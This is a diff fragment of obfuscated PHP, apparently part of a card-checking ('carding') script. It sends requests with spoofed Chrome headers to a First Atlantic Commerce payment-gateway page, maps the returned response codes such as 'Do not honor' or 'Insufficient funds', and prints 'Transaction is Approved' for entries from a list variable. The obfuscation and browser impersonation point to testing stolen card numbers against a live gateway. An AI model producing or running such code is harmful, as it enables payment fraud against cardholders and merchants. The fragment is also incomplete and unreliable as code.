+${$GLOBALS["jhxpcrxn"]}[] = "Origin: https://marlin.firstatlanticcommerce.com";
+${$yvxnswk}[] = "Referer: https://marlin.firstatlanticcommerce.com/SENTRY/PaymentGateway/Application/WFrmAuthenticate.aspx";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Fetch-Dest: document";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Fetch-Mode: navigate";
+${$sdajdrkdjos}[] = "Sec-Fetch-Site: same-origin";
+${$GLOBALS["cyjkgco"]}[] = "Upgrade-Insecure-Requests: 1";
+${$qnvrfmtjhb}[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Ch-Ua: \\\"Google Chrome\\\";v=\\\"117\\\", \\\"Not;A=Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"117\\\"";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Ch-Ua-Mobile: ?0";
+${$GLOBALS["nssrquipxk"]}[] = "Sec-Ch-Ua-Platform: \\\"Windows\\\"";
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_HTTPHEADER, ${$GLOBALS["jhxpcrxn"]});
+${$GLOBALS["mwdplf"]} = curl_exec(${$GLOBALS["muggyyvx"]});
+curl_close(${$iwxclthclqt});
+$fdmqgx = "errorCode";
+${$GLOBALS["lrskmnrd"]} = parse(${$GLOBALS["mwdplf"]}, "id=\"ReasonCodeDesc\" value=\"", "\"");
+${$GLOBALS["glohqont"]} = parse(${$zywgrvop}, "id=\"OriginalResponseCode\" value=\"", "\"");
+switch (${$GLOBALS["qjoiurmrhip"]}) {
+    case "00":
+        ${$GLOBALS["ueplvovhv"]} = "Transaction approved or successful";
+        break;
+    case "01":
+        ${$ndqlzp} = "Refer to card issuer";
+        break;
+    case "02":
+        ${$GLOBALS["ueplvovhv"]} = "Refer to card issuer, special condition";
+        break;
+    case "03":
+        ${$kjolpirllnoj} = "Invalid merchant or service provider";
+        break;
+    case "04":
+        ${$uieaytvwigo} = "Pick up card (no fraud)";
+        break;
+    case "05":
+        ${$GLOBALS["ueplvovhv"]} = "Do not honor";
+        break;
+    case "06":
+        ${$GLOBALS["ueplvovhv"]} = "Error";
+        break;
+    case "12":
+        ${$GLOBALS["ueplvovhv"]} = "Invalid transaction";
+        break;
+    case "13":
+        ${$GLOBALS["wsqzrdp"]} = "Invalid amount";
+        break;
+    case "14":
+        ${$GLOBALS["ueplvovhv"]} = "Invalid card number";
+        break;
+    case "15":
+        ${$GLOBALS["ueplvovhv"]} = "No such issuer";
+        break;
+    case "51":
+        ${$GLOBALS["ueplvovhv"]} = "Insufficient funds";
+        break;
+    case "54":
+        ${$GLOBALS["ueplvovhv"]} = "Expired card";
+        break;
+    case "57":
+        ${$kdoscgo} = "Transaction not permitted to cardholder";
+        break;
+    case "58":
+        ${$mqqkzmjeq} = "Transaction not allowed at terminal";
+        break;
+    case "59":
+        ${$GLOBALS["bvkbrqyybcb"]} = "Suspected fraud";
+        break;
+    case "91":
+        ${$pzeievrqtowo} = "Issuer or switch is unavailable";
+        break;
+    case "92":
+        ${$GLOBALS["yvnnxg"]} = "Financial institution or intermediate network facility cannot be found for routing";
+        break;
+    case "93":
+        ${$uowfldma} = "Transaction cannot be completed";
+        break;
+    case "94":
+        ${$GLOBALS["prhnqclofqsd"]} = "Duplicate transmission";
+        break;
+    case "96":
+        ${$fdmqgx} = "System malfunction";
+        break;
+    case "97":
+        ${$GLOBALS["ueplvovhv"]} = "Reconciliation totals (batch totals) are not equal";
+        break;
+    case "98":
+        ${$GLOBALS["ueplvovhv"]} = "Duplicate reversal";
+        break;
+    case "99":
+        ${$ibvljwgn} = "General error";
+        break;
+    case "N7":
+        ${$GLOBALS["ueplvovhv"]} = "CVV2 Declined / Mismatch";
+        break;
+    default:
+        ${$GLOBALS["ueplvovhv"]} = "Unknown error code";
+        break;
+}
+if (strpos(${$lebaamnxxk}, "id=\"OriginalResponseCode\" value=\"00\"")) {
+    echo "00 : Transaction is Approved {$lista} \$";
+} else {
+    echo "{$ReasonCodeDesc}: {$lista} {$OriginalResponseCode} : {$errorCode}";
+}
+echo "\n";
